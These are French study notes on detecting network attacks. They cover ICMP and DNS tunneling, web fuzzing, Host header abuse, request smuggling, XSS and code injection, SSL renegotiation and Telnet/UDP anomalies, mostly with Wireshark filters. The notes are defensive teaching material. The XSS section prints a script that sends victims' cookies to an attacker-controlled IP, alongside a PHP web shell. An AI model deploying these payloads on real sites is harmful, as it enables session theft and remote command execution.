Lorsqu'un attaquant a besoin d'envoyer des donn√©es vers un h√¥te externe, il peut utiliser le tunneling. Cela peut se faire en √©tablissant une commande et un contr√¥le sur une machine compromise. Les attaquants utilisent divers protocoles pour le tunneling, notamment SSH, HTTP, HTTPS, DNS et ICMP, chacun permettant de contourner les mesures de s√©curit√© r√©seau.
ICMP Tunneling

L'ICMP tunneling consiste √† ins√©rer des donn√©es dans le champ de donn√©es des requ√™tes ICMP pour les dissimuler dans le trafic r√©seau normal. Comme ICMP est un protocole l√©gitime utilis√© pour la gestion des r√©seaux, il est souvent n√©glig√© par les m√©canismes de s√©curit√©, ce qui permet aux attaquants de contourner facilement les contr√¥les r√©seau.
D√©tection de l'ICMP Tunneling

Le tunneling ICMP implique l'insertion de donn√©es dans le champ de donn√©es des requ√™tes ICMP, ce qui peut √™tre d√©tect√© en examinant la taille des donn√©es dans les requ√™tes et r√©ponses ICMP. Voici quelques m√©thodes pour identifier ce type d'attaque :
Filtrage ICMP avec Wireshark

Utilisez le filtre ICMP dans Wireshark pour visualiser le trafic sp√©cifique ICMP :

icmp
D√©tection de Transferts de Donn√©es Importants

Le trafic ICMP fragment√© ou des champs de donn√©es exceptionnellement larges peuvent indiquer un tunneling. Les requ√™tes ICMP normales ont des champs de donn√©es relativement petits (environ 48 octets). Si la taille du champ de donn√©es d√©passe 48 octets, cela pourrait signaler un transfert de donn√©es, souvent li√© au tunneling. Les tailles de donn√©es peuvent parfois atteindre 38 000 octets dans des attaques avanc√©es.
Inspection du Contenu des Donn√©es

Dans Wireshark, vous pouvez inspecter le contenu des donn√©es dans les requ√™tes ICMP pour d√©tecter des informations sensibles (comme des identifiants, des mots de passe, etc.). Cela peut √™tre un signe direct de tunneling ICMP. Si les donn√©es semblent cod√©es ou crypt√©es, elles n√©cessitent une attention particuli√®re.
D√©codage des Donn√©es Encod√©es

Les attaquants peuvent encoder ou crypter les donn√©es exfiltr√©es dans les paquets ICMP pour √©viter la d√©tection. Dans ce cas, le d√©codage manuel des donn√©es encod√©es pourrait √™tre n√©cessaire. Par exemple, si vous d√©tectez une cha√Æne encod√©e en base64, vous pouvez utiliser la commande suivante pour la d√©coder :

echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
Cela renverra le texte d√©cod√©, qui pourrait contenir des informations sensibles exfiltr√©es.
Anomalies de Taille de Donn√©es ICMP

Si les tailles de donn√©es ICMP d√©passent les tailles typiques (environ 48 octets), cela n√©cessite une analyse plus approfondie. Un transfert de donn√©es excessif dans un paquet ICMP est souvent un indicateur cl√© de tunneling.
Pr√©vention du Tunneling ICMP

Voici quelques m√©thodes pour pr√©venir et limiter l'impact des attaques par tunneling ICMP :
Bloquer les Requ√™tes ICMP

   D√©sactiver les requ√™tes ICMP dans le r√©seau peut emp√™cher le tunneling ICMP, bien que cela puisse affecter les diagnostics de r√©seau l√©gitimes. Cette approche emp√™che les attaquants d'utiliser ICMP comme vecteur pour le tunneling.
Inspecter les Requ√™tes et R√©ponses ICMP

   En surveillant et en analysant le trafic ICMP, surtout les champs de donn√©es, il est possible de d√©tecter et d'att√©nuer les activit√©s suspectes de tunneling. Les administrateurs r√©seau doivent √™tre attentifs aux anomalies dans les tailles de donn√©es ICMP et aux tentatives de communication cach√©es.
Conclusion

Le tunneling ICMP repr√©sente une m√©thode sophistiqu√©e d'exfiltration de donn√©es. Cependant, avec une surveillance appropri√©e et l'utilisation d'outils comme Wireshark, il est possible de d√©tecter des anomalies dans le trafic ICMP et de prendre des mesures pour prot√©ger le r√©seau. Les efforts de pr√©vention, comme la d√©sactivation du ICMP ou l'inspection continue du trafic r√©seau, sont essentiels pour pr√©venir ce type de menace.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>HTTP &amp; HTTPs Service Enumeration</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8058-a25b-e62400f8feec"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection et Pr√©vention des Tentatives de Fuzzing sur les Serveurs Web

Les mod√®les de trafic HTTP/HTTPS inhabituels peuvent indiquer des attaques potentielles contre les serveurs web. Les attaquants exploitent souvent les vuln√©rabilit√©s de la couche de transport pour collecter des informations, explorer ou exploiter les applications web. L'une de ces m√©thodes d'attaque est le fuzzing, qui consiste √† envoyer des donn√©es al√©atoires ou inattendues √† un serveur pour d√©couvrir des vuln√©rabilit√©s.
Indicateurs des Tentatives de Fuzzing

Les signes courants des tentatives de fuzzing incluent :
Un trafic HTTP/HTTPS excessif provenant d'un seul h√¥te, souvent avec des mod√®les de requ√™tes irr√©guliers.
Des tentatives d'acc√®s r√©p√©titives ou inhabituelles trouv√©es dans les journaux d'acc√®s du serveur web, comme des requ√™tes pour des fichiers ou des r√©pertoires inexistants.
D√©tection du Fuzzing de R√©pertoires

Le fuzzing de r√©pertoires consiste √† tester l'existence de pages web ou de r√©pertoires vuln√©rables. Cela se fait g√©n√©ralement en envoyant de nombreuses requ√™tes HTTP pour diff√©rents chemins.
Filtre Wireshark pour le Fuzzing de R√©pertoires :
Filtre de base :
Filtrer le trafic HTTP : http
Isoler les requ√™tes :
Pour se concentrer uniquement sur les requ√™tes (excluant les r√©ponses) : http.request
Indicateurs du Fuzzing de R√©pertoires :
R√©ponses 404 fr√©quentes, ce qui indique des tentatives r√©p√©t√©es d'acc√®s √† des fichiers ou r√©pertoires inexistants.
S√©quences de requ√™tes rapides, o√π plusieurs requ√™tes sont envoy√©es dans une courte p√©riode.
Exemple :

Les journaux d'acc√®s peuvent afficher des entr√©es comme celles-ci :

192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bashhistory HTTP/1.1" 404 435 "-" "Mozilla/4.0"
Analyser les Journaux du Serveur Web pour le Fuzzing

Pour d√©tecter les tentatives de fuzzing sur votre serveur web, inspectez les journaux d'acc√®s pour rep√©rer une activit√© inhabituelle.
Commandes pour Filtrer les Journaux par Adresse IP :
Avec grep :

  cat access.log | grep "192.168.10.5"
  Avec awk :

  cat access.log | awk '$1 == "192.168.10.5"'
  Recherchez des acc√®s rapides et r√©p√©titifs √† des ressources non existantes (comme .bashhistory, .git, ou des demandes de chemins inhabituels).

D√©tecter d'Autres Techniques de Fuzzing

Les attaquants peuvent √©galement cibler des √©l√©ments dynamiques ou statiques de la page web, comme des champs ID, ou tester des vuln√©rabilit√©s de type IDOR (Insecure Direct Object Reference). Ils peuvent utiliser des outils pour envoyer ces charges utiles, en particulier lors de l'analyse de JSON.
Filtre Wireshark pour l'Analyse d'un H√¥te Sp√©cifique :

Pour examiner le trafic provenant d'un h√¥te sp√©cifique, appliquez le filtre suivant :

http.request and ((ip.srchost == &lt;IP suspect√©e&gt;) or (ip.dsthost == &lt;IP suspect√©e&gt;))
Suivre les Flux HTTP :
Faites un clic droit sur n'importe quelle requ√™te HTTP dans Wireshark et s√©lectionnez Follow &gt; HTTP Stream pour voir la s√©quence compl√®te des requ√™tes et r√©ponses de cette session.
Indicateurs du Fuzzing Avanc√© :
Mod√®les de requ√™tes rapides, surtout pour des ressources qui n'existent pas.
Attaques √©chelonn√©es ou distribu√©es, o√π les requ√™tes sont √©tendues dans le temps ou r√©parties sur plusieurs adresses IP pour √©viter la d√©tection.

Pr√©venir les Tentatives de Fuzzing

Pour se prot√©ger contre les tentatives de fuzzing et r√©duire le risque d'exploitation r√©ussie :
Ajuster les Configurations du Serveur :
Configurez votre serveur (par exemple, Apache ou Nginx) pour retourner les codes de r√©ponse appropri√©s pour les ressources inexistantes.
Utilisez des pages d'erreur personnalis√©es qui ne r√©v√®lent pas d'informations sensibles sur la structure ou les fonctionnalit√©s du serveur.
Mettre en place des R√®gles de Web Application Firewall (WAF) :
Les WAF peuvent bloquer des IP sp√©cifiques ou des mod√®les de comportement suspect, comme des taux de requ√™tes inhabituels ou des tentatives r√©p√©t√©es d'acc√®s √† des ressources inexistantes.
Limiter le Taux de Requ√™tes :
Impl√©mentez des techniques de limitation du taux pour r√©duire l'efficacit√© des outils automatis√©s de fuzzing.
Contr√¥le d'Acc√®s :
Assurez-vous que les r√©pertoires ou fichiers sensibles sont correctement s√©curis√©s ou cach√©s de l'acc√®s public (par exemple, .git, .bash_history).

En surveillant activement ces mod√®les et en mettant en place des protections robustes, les serveurs web peuvent √™tre mieux prot√©g√©s contre les attaques par fuzzing.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Strange HTTP Headers</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8035-bdf9-d8ddf779ad2e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic du Serveur Web et D√©tection des Activit√©s Suspectes

Lorsque vous analysez le trafic d'un serveur web, l'absence de signes √©vidents comme le fuzzing ne garantit pas la s√©curit√©. Une inspection plus approfondie, en particulier des en-t√™tes HTTP inhabituels, peut r√©v√©ler une activit√© suspecte. Voici quelques anomalies courantes √† surveiller :
En-t√™tes Host Anormaux

Les en-t√™tes Host manipul√©s ou inattendus sont souvent un signe d'attaque. Par exemple, un attaquant pourrait tenter de forcer un serveur √† ex√©cuter une requ√™te vers une adresse ou un sous-domaine non autoris√©, ou √† contourner des restrictions de domaine.
Filtrage du Trafic HTTP

Commencez par limiter le trafic dans Wireshark pour observer uniquement les requ√™tes et r√©ponses HTTP :

http
Isolation des En-t√™tes Host Irr√©guliers

Sp√©cifiez l'adresse IP du serveur l√©gitime pour exclure le trafic normal. Pour un serveur externe, remplacez par le nom de domaine :

http.request and (!(http.host == "192.168.10.7"))
Indicateurs de Manipulation des En-t√™tes Host

Examinez les r√©sultats pour d√©tecter des en-t√™tes Host suspects tels que 127.0.0.1 ou des noms d'h√¥te inhabituels comme admin. Les attaquants manipulent souvent ces en-t√™tes pour escalader les privil√®ges en utilisant des outils de proxy comme Burp Suite.
Mesures Pr√©ventives :
V√©rifiez les configurations virtualhost et d'acc√®s pour emp√™cher un acc√®s non autoris√©.
Gardez votre serveur web mis √† jour.

Analyse des Erreurs 400 et D√©tection du Smuggling de Requ√™tes

Le code d'erreur 400 (Bad Request) peut indiquer une activit√© suspecte et est utile pour identifier des actions HTTP malveillantes, notamment les attaques de smuggling de requ√™tes (injection CRLF).
Filtrage des R√©ponses de Code 400

Pour d√©tecter les tentatives de request smuggling, filtrez les r√©ponses avec le code 400 dans Wireshark :

http.response.code == 400
Suivez ces flux HTTP pour d√©couvrir des tentatives de CRLF Injection, une forme de smuggling o√π un attaquant tente de contourner les contr√¥les de s√©curit√© via des en-t√™tes HTTP malform√©s.
Exemple de Tentative de CRLF

Un attaquant pourrait construire une requ√™te comme suit :

GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5
\r\n
GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080
\r\n
HTTP/1.1
Host: 192.168.10.5
D√©cod√© par le serveur, cela donne deux requ√™tes distinctes :

GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

HTTP/1.1
Host: 192.168.10.5
Si le serveur est vuln√©rable, les deux requ√™tes peuvent r√©ussir, permettant un acc√®s non autoris√©.
Exemple de Configuration Apache Vuln√©rable

Certaines configurations Apache mal s√©curis√©es peuvent laisser le serveur vuln√©rable √† ce type d'attaque :

&lt;VirtualHost :80&gt;
    RewriteEngine on
    RewriteRule "^/categories/(.)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
    ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
&lt;/VirtualHost&gt;
Cette mauvaise configuration permet √† l'attaquant de rediriger les requ√™tes vers un autre serveur sans restrictions, facilitant l'attaque de smuggling de requ√™tes.

Surveillance des Exploits R√©ussis

Pour d√©tecter un exploit r√©ussi, surveillez la pr√©sence d'un code 200 (Success) en r√©ponse √† une requ√™te suspecte. Une analyse r√©guli√®re des r√©ponses avec les codes 400 et 200 est essentielle pour identifier et att√©nuer les actions adverses dans le trafic HTTP.

En r√©sum√©, la d√©tection des attaques de manipulation des en-t√™tes Host et de request smuggling repose sur une vigilance constante sur les erreurs HTTP, les anomalies dans les en-t√™tes et le suivi des codes de statut HTTP dans le trafic.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Cross-Site Scripting (XSS) &amp; Code Injection Detection</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8042-a834-ca859d33ab7b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection d'un comportement anormal dans le trafic HTTP

Un volume inhabituel de requ√™tes HTTP vers un "serveur" interne inconnu peut signaler une activit√© suspecte, notamment une attaque de type Cross-Site Scripting (XSS). Ces requ√™tes peuvent servir √† exfiltrer des cookies ou des jetons de session, m√™me si les valeurs sont souvent encod√©es ou chiffr√©es en transit.

Cross-Site Scripting (XSS)

L‚ÄôXSS survient lorsqu‚Äôun attaquant injecte du code JavaScript malveillant dans une page web via des champs d'entr√©e utilisateur. Ce code est ensuite ex√©cut√© dans le navigateur des autres utilisateurs, permettant √† l‚Äôattaquant de voler des donn√©es sensibles comme les cookies ou tokens de session.
Exemple de payload XSS :

&lt;script&gt;
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
&lt;/script&gt;
Ce que fait ce script : il capture les cookies de l‚Äôutilisateur et les envoie silencieusement √† une IP interne contr√¥l√©e par l‚Äôattaquant.
Si ce type de code est d√©tect√© :
Supprimez imm√©diatement le script inject√©.
Consid√©rez la mise hors ligne temporaire du serveur concern√© pour appliquer des correctifs de s√©curit√©.

Injection de code (PHP, etc.)

Des attaquants peuvent aussi exploiter des champs de saisie pour y ins√©rer du code ex√©cutable (comme PHP), afin d‚Äôobtenir un acc√®s √† distance ou de prendre le contr√¥le du serveur.
Exemples typiques de code PHP malveillant :

&lt;?php system($_GET['cmd']); ?&gt;
Permet √† l‚Äôattaquant d‚Äôex√©cuter des commandes syst√®me √† distance via l‚ÄôURL.

&lt;?php echo whoami; ?&gt;
Affiche l‚Äôutilisateur courant ex√©cutant le serveur web.
Si ce code est d√©couvert :
Supprimez-le imm√©diatement.
Identifiez l'origine de l'injection et s√©curisez la faille utilis√©e.

Mesures de pr√©vention contre les attaques XSS et les injections de code
Sanitiser les entr√©es utilisateur :
√âvitez tout contenu HTML/JS non filtr√©.
Utilisez des fonctions comme htmlspecialchars() (PHP), DOMPurify (JS) ou des ORM s√©curis√©s c√¥t√© serveur.
Ne jamais ex√©cuter d'entr√©e utilisateur comme du code :
Aucune donn√©e envoy√©e par l'utilisateur ne doit √™tre √©valu√©e dynamiquement (eval(), system(), etc.).
Pr√©f√©rez les appels param√©tr√©s et les API s√©curis√©es.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SSL Renegotiation Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80b6-8667-d4510b08ad1b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic HTTPS et D√©tection des Attaques Bas√©es sur SSL/TLS

Lors de l'analyse du trafic HTTPS, il est essentiel de comprendre les indicateurs du protocole HTTPS qui peuvent r√©v√©ler des attaques bas√©es sur SSL/TLS. HTTPS repose sur des protocoles de chiffrement, sp√©cifiquement :
Transport Layer Security (TLS)
Secure Sockets Layer (SSL)
Processus de Connexion HTTPS
Handshake (Poign√©e de main) : Le serveur et le client √©tablissent une connexion, s'accordant sur les algorithmes de chiffrement et √©changent des certificats.
Chiffrement : Apr√®s la poign√©e de main, la connexion est chiffr√©e avec l'algorithme s√©lectionn√©.
√âchange de Donn√©es : Les donn√©es chiffr√©es (pages web, images, etc.) sont √©chang√©es entre le client et le serveur.
D√©chiffrement : Les deux c√¥t√©s d√©chiffrent les donn√©es √† l'aide de leurs cl√©s priv√©es et publiques.
Attaque de Ren√©gociation SSL

Les attaques de ren√©gociation SSL tentent de n√©gocier des normes de chiffrement plus faibles ou d'exploiter les ressources du serveur, entra√Ænant des vuln√©rabilit√©s potentielles. Un autre exemple d'attaque li√©e au chiffrement HTTPS est la vuln√©rabilit√© Heartbleed (CVE-2014-0160).
Processus de Handshake TLS et SSL

Pour s√©curiser une connexion, un handshake TLS ou SSL est n√©cessaire, impliquant :
Client Hello : Le client envoie les versions TLS/SSL prises en charge, les suites de chiffrement et des donn√©es al√©atoires.
Server Hello : Le serveur r√©pond avec la version choisie, la suite de chiffrement et un nonce.
√âchange de Certificats : Le serveur envoie son certificat contenant la cl√© publique.
√âchange de Cl√©s : Le client g√©n√®re un premaster secret, le chiffre avec la cl√© publique du serveur, et l'envoie au serveur.
D√©rivation de la Cl√© de Session : Les deux parties d√©rivent des cl√©s de session √† l'aide des nonces √©chang√©s et du premaster secret.
Messages de Fin : Les deux parties √©changent des messages de fin, confirmant la r√©ussite du handshake.
√âchange S√©curis√© de Donn√©es : La communication chiffr√©e commence.
D√©tail Algorithmique du Handshake TLS

| √âtape du Handshake                  | Calculs pertinents                                                                                                       |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Client Hello                    | ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }                                          |
| Server Hello                    | ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod }                                            |
| √âchange de Certificat           | ServerCertificate = { ServerPublicCertificate }                                                                          |
| √âchange de Cl√©s                 | ClientDHPublicKey = DH\KeyGeneration(ClientDHPrivateKey) &lt;br&gt; ServerDHPublicKey = DH\KeyGeneration(ServerDHPrivateKey) |
| Premaster Secret                | PremasterSecret = DH\KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)                                                |
| D√©rivation de la Cl√© de Session | MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)                                          |
| Extraction des Cl√©s de Session  | ClientWriteMACKey, ServerWriteMACKey, ClientWriteKey, ServerWriteKey, ClientWriteIV, ServerWriteIV                       |
| Messages de Fin                 | FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))                                         |
D√©tection des Attaques de Ren√©gociation SSL
Filtrer les Messages de Handshake : Dans Wireshark, utilisez le filtre suivant pour voir uniquement les messages de handshake :

ssl.record.contenttype == 22
Indicateurs des Attaques de Ren√©gociation SSL :
Multiples Client Hellos : Des messages Client Hello r√©p√©t√©s d'un m√™me client dans un court laps de temps signalent une attaque, car l'attaquant d√©clenche √† plusieurs reprises la ren√©gociation pour abaisser la suite de chiffrement.
Messages de Handshake D√©sordonn√©s : Observer des messages Client Hello apr√®s la fin du handshake peut indiquer une manipulation ou une attaque.
Raisons des Attaques de Ren√©gociation SSL
D√©ni de Service : Une ren√©gociation excessive consomme des ressources serveur, rendant le serveur non r√©actif.
Exploitation de la Suite de Chiffrement : Les attaquants peuvent tenter une ren√©gociation pour exploiter des configurations de chiffrement faibles.
Cryptanalyse : La ren√©gociation peut faciliter la cryptanalyse en aidant les attaquants √† analyser les mod√®les SSL/TLS, ce qui pourrait exposer des vuln√©rabilit√©s.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Peculiar DNS Traffic</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8099-95e0-dba6a15333f7"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic DNS

L‚Äôanalyse du trafic DNS peut √™tre complexe en raison de son volume √©lev√©, mais il est essentiel d'identifier les anomalies pour d√©tecter les activit√©s malveillantes. Voici un aper√ßu du fonctionnement des requ√™tes DNS et des m√©thodes de d√©tection d'activit√©s suspectes.
Requ√™tes DNS

Les requ√™tes DNS permettent aux clients de r√©soudre des noms de domaine en adresses IP et vice versa.
Requ√™tes DNS Forward (Recherche Directe)

Dans une recherche directe (forward lookup), le client r√©sout un nom de domaine en une adresse IP, suivant ces √©tapes :
Initiation de la Requ√™te : Le client interroge un domaine, par exemple academy.hackthebox.com.
V√©rification du Cache Local : V√©rifie le cache DNS local ; si non r√©solu, continue.
Requ√™te R√©cursive : Envoie la requ√™te au serveur DNS configur√©.
Serveurs Racine : Si n√©cessaire, le r√©solveur DNS interroge les serveurs racine.
Serveurs TLD : Le serveur racine dirige vers les serveurs TLD (par exemple, .com).
Serveurs Autoritatifs : Le serveur TLD oriente vers le serveur autoritatif du domaine.
Serveurs Autoritatifs du Domaine : Le r√©solveur obtient l‚Äôadresse IP.
R√©ponse : L'adresse IP est renvoy√©e au client.
Requ√™tes DNS Reverse (Recherche Inverse)

Les recherches inverses sont utilis√©es pour trouver un nom de domaine √† partir d'une adresse IP :
Initiation de la Requ√™te : Le client envoie une requ√™te DNS inverse avec l‚Äôadresse IP.
Zones de Recherche Inverse : Le r√©solveur DNS v√©rifie s'il est autoris√©.
Requ√™te pour le PTR : Le r√©solveur recherche un enregistrement PTR.
R√©ponse : Le FQDN (Fully Qualified Domain Name) est retourn√© si un PTR correspondant est trouv√©.
Types d'Enregistrements DNS

| Type d'Enregistrement | Description                                          |
| --------------------- | ---------------------------------------------------- |
| A                 | Associe un nom de domaine √† une adresse IPv4         |
| AAAA              | Associe un nom de domaine √† une adresse IPv6         |
| CNAME             | Cr√©e un alias pour un domaine                        |
| MX                | Sp√©cifie le serveur de messagerie pour le domaine    |
| NS                | Serveurs de noms autoritatifs pour le domaine        |
| PTR               | Utilis√© pour les recherches inverses (IP -&gt; Domaine) |
| TXT               | Sp√©cifie du texte associ√© au domaine                 |
| SOA               | Informations administratives sur la zone             |
D√©tection des Tentatives d'√©num√©ration DNS

Un volume √©lev√© de requ√™tes DNS provenant d'un seul h√¥te peut indiquer une √©num√©ration DNS. Pour d√©tecter cela, vous pouvez filtrer le trafic DNS dans Wireshark en utilisant le filtre suivant :

dns
Si des requ√™tes incluent ANY, cela peut indiquer une √©num√©ration DNS, voire une √©num√©ration de sous-domaines.
D√©tection du Tunneling DNS

Le tunneling DNS peut impliquer un nombre important d'enregistrements TXT provenant d'un seul h√¥te. Les attaquants peuvent exfiltrer des donn√©es en les appendant dans le champ TXT des requ√™tes DNS.
Indicateurs de Tunneling DNS

Examinez le trafic DNS pour d√©tecter des donn√©es inhabituelles ou inattendues dans le champ TXT. Les donn√©es peuvent √™tre encod√©es ou chiffr√©es, souvent en base64 :
Exemple de donn√©es encod√©es en base64 :

echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
Gestion de l'Encodage Multiple

Certains attaquants peuvent encoder les donn√©es plusieurs fois ou les chiffrer, rendant leur d√©tection plus difficile :

echo 'encoded_string' | base64 -d | base64 -d | base64 -d
Raisons du Tunneling DNS
Exfiltration de donn√©es : Utilis√© pour exporter de mani√®re furtive des donn√©es d‚Äôun r√©seau.
Commandes et Contr√¥le : Permet aux syst√®mes compromis de communiquer avec les serveurs contr√¥l√©s par l'attaquant, souvent utilis√©s dans les botnets.
Bypass de Pare-feu : Les tunnels DNS peuvent contourner les pare-feu ou les proxys se concentrant sur les protocoles HTTP/HTTPS.
Domain Generation Algorithms (DGA) : Les malwares avanc√©s utilisent des algorithmes de g√©n√©ration de domaines (DGA) pour g√©n√©rer des noms de domaine dynamiques, compliquant ainsi la d√©tection.
L'IPFS et le Tunneling DNS

Des acteurs de menaces avanc√©es peuvent utiliser IPFS (Interplanetary File System) pour stocker et r√©cup√©rer des fichiers malveillants. Cela rend le trafic DNS/HTTP vers des URI comme celles-ci particuli√®rement significatif :
Exemple d'URI IPFS :

https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
IPFS fonctionne de mani√®re d√©centralis√©e, ce qui complique sa d√©tection. La surveillance r√©guli√®re du trafic DNS et HTTP/HTTPS est essentielle pour att√©nuer ces attaques.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Strange Telnet &amp; UDP Connections</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8017-a515-f026cd8673ae"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic Telnet et UDP : D√©tection des Activit√©s Suspectes

Lors de l'analyse du trafic r√©seau, il est essentiel de pr√™ter attention au trafic Telnet et au trafic UDP, qui peuvent parfois r√©v√©ler des activit√©s suspectes ou anormales qui pourraient autrement passer inaper√ßues.
Telnet

Le protocole Telnet, bien qu'√©tant obsol√®te en raison de ses pr√©occupations en mati√®re de s√©curit√©, est encore utilis√© dans certains syst√®mes h√©rit√©s (par exemple, les anciens syst√®mes Windows NT). M√™me si Telnet est largement remplac√© par SSH pour la communication √† distance s√©curis√©e, il peut encore √™tre utile de surveiller le trafic Telnet pour d√©tecter d'√©ventuelles connexions suspectes ou abusives.
D√©tection du Trafic Telnet Traditionnel sur le Port 23

Le port 23 est le port par d√©faut pour Telnet. Lorsque vous observez du trafic sur ce port dans Wireshark, portez une attention particuli√®re aux communications pour rep√©rer tout signe d'abus. Bien que Telnet soit un protocole non crypt√© et facile √† inspecter, les attaquants peuvent parfois chiffrer ou obfusquer les donn√©es dans le trafic Telnet. Il est donc n√©cessaire d'√™tre vigilant et d'inspecter minutieusement les flux de donn√©es.
Trafic Telnet Non Reconnu sur des Ports Non Standards

Telnet peut fonctionner sur n'importe quel port, et les attaquants peuvent d√©placer les communications Telnet vers des ports non standards pour masquer leurs activit√©s malveillantes. Par exemple, des communications sur le port 9999 peuvent indiquer une tentative de dissimulation. Dans ce cas, il est conseill√© de suivre le flux TCP dans Wireshark pour examiner davantage.
Trafic Telnet via IPv6

Si du trafic Telnet via IPv6 est d√©tect√© dans un r√©seau configur√© en IPv4, cela pourrait indiquer un acc√®s non autoris√©. Pour filtrer sp√©cifiquement le trafic Telnet sur IPv6 dans Wireshark, utilisez le filtre suivant :

((ipv6.srchost == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dsthost == fe80::c9c8:ed3:1b10:f10b)) and telnet
Ce filtre vous aide √† isoler le trafic Telnet sur des adresses IPv6 sp√©cifiques pour une inspection plus approfondie.

Surveillance des Communications UDP

Le trafic UDP est souvent utilis√© par les attaquants pour contourner la surveillance bas√©e sur TCP, en raison de la nature sans connexion et de la transmission rapide d'UDP. Cette caract√©ristique peut √™tre avantageuse pour l'exfiltration de donn√©es furtives.
TCP vs UDP

Contrairement √† TCP, qui n√©cessite un processus de handshake (SYN, SYN/ACK, ACK) avant la transmission des donn√©es, UDP est un protocole sans connexion, ce qui permet une communication plus rapide, mais r√©duit la fiabilit√© et la tra√ßabilit√© des connexions.
Utilisations Courantes de UDP

Lors de l'investigation du trafic UDP, il est important de prendre en compte les cas d'utilisation l√©gitimes suivants :
Applications en temps r√©el : Des applications telles que la vid√©o en streaming, les jeux en ligne, et la voix sur IP utilisent UDP pour des connexions plus rapides.
DNS (Domain Name System) : Les requ√™tes et r√©ponses DNS sont principalement bas√©es sur UDP.
DHCP (Dynamic Host Configuration Protocol) : UDP est utilis√© pour attribuer des adresses IP et configurer les r√©seaux.
SNMP (Simple Network Management Protocol) : UDP est utilis√© pour la surveillance et la gestion du r√©seau.
TFTP (Trivial File Transfer Protocol) : TFTP, un protocole pour les transferts de fichiers simples, utilise √©galement UDP, notamment dans les syst√®mes plus anciens.
Anomalies dans le Trafic UDP

Pour un trafic UDP inhabituel, suivez le flux dans Wireshark pour inspecter son contenu et v√©rifier sa l√©gitimit√©. Toute communication non attendue ou incoh√©rente pourrait indiquer une activit√© malveillante, comme de l'exfiltration de donn√©es ou des attaques par amplification.

R√©sum√©
Telnet : Bien que de plus en plus obsol√®te, le trafic Telnet sur des ports non standards ou via IPv6 doit √™tre surveill√© de pr√®s, surtout s'il provient de sources ou destinations suspectes. La d√©tection de Telnet sur des ports inattendus, comme le port 9999, peut indiquer une tentative d'obscurcissement des activit√©s malveillantes.
UDP : Le trafic UDP, en raison de son caract√®re sans connexion, peut √™tre utilis√© √† des fins d'exfiltration furtive de donn√©es ou d'attaque. Surveillez attentivement les flux UDP inhabituels, en particulier pour des services comme DNS, DHCP, et SNMP qui utilisent souvent ce protocole.

En √©tant vigilant et en filtrant correctement les flux, vous pouvez d√©tecter les anomalies de mani√®re efficace et r√©duire les risques associ√©s √† ces types de trafic.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Working with IDS/IPS</summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Suricata Fundamentals</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80d9-ab48-d84459f87682"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Suricata, g√©r√© par l'Open Information Security Foundation (OISF), est une solution de s√©curit√© r√©seau open-source id√©ale pour les Syst√®mes de D√©tection d'Intrusions (IDS), les Syst√®mes de Pr√©vention d'Intrusions (IPS) et la Surveillance de la S√©curit√© du R√©seau (NSM). Elle excelle dans l'inspection approfondie des paquets et offre une journalisation compl√®te, aidant les administrateurs √† d√©tecter et r√©pondre aux activit√©s suspectes dans le trafic r√©seau.
Modes de fonctionnement de Suricata
Syst√®me de D√©tection d'Intrusions (IDS) : Surveille passivement le trafic, signale les menaces potentielles et am√©liore la visibilit√© du r√©seau, mais n'intervient pas.
